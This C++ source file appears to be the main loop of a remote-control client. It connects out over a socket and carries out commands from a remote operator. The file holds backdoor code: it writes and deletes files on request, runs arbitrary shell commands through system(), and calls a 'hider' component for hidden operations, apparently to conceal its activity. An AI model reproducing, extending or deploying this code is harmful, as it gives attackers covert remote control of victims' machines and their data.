#include <iostream>

#include "Errors.h"
#include "client.h"
#include "SoftwareManeger.h"
#include "FunCodes.h"
#include "HiderManeger.h"
#include "HiderCodes.h"

void testSoftwareManeger(void);

int main(int argc, char * argv[]) {
    
    Client client;
    client.createSocket();
    SoftwareManeger swm = SoftwareManeger();
    HiderManeger hiderManager = HiderManeger();
    
    while (true)
    {
        loopIter(client, swm, hiderManager);
    }

    return 0;
}

void testSoftwareManeger() {
    SoftwareManeger swm = SoftwareManeger();
    swm.chunkWrite("tempSwmTest.txt", false, "this is my first test\n");
    swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
    
    swm.deleteFile("tempSwmTest.txt");

}

void fileWrite(Client& client, std::string param, SoftwareManeger& swm)
{
    bool cont = true;
    bool isAppend = false;
    char buffer[BUFFER_SIZE] = {0};
    while (client.recvData(buffer) > 0)
    {
        swm.chunkWrite(param, isAppend, buffer);
        isAppend = true;
    }
}


void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
{
    // receive command
    Message msg;
    Error res;
    client.recvCommand(msg);
    uint fncode = msg.fnccode();
    std::string param = msg.param1();

    std::string response = "";
    switch (fncode)
    {
    case WRITE_FILE:
        fileWrite(client, param, swm);
        break;

    case DELETE_FILE:
        res = swm.deleteFile(param);
        break;

    case RUN_BASH:
        system(param.c_str());
        break;

    case HIDER_SETUP:
        hiderManeger.setUpHider(param);
        break;
    }
    // hidden handling
    if (fncode & HIDDEN_OPRATION) {
        res = hiderManeger.hiddenAction(fncode, param, client);
    }
    
    // TODO change such that there will be response only if we want it to be 
    Message msgres;
    msgres.set_fnccode(res);
    msgres.set_param1(response);
    client.sendCommand(msgres);
}
